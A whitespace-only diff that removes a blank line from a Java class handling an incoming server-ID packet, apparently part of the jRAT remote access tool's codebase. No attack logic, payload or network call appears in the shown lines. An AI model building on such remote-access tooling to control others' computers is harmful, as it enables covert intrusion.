@@ -7,7 +7,6 @@ import pro.jrat.settings.ServerID;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.Utils;
 
-
 public class Packet15InitServerID extends AbstractIncomingPacket {
 
 	@Override
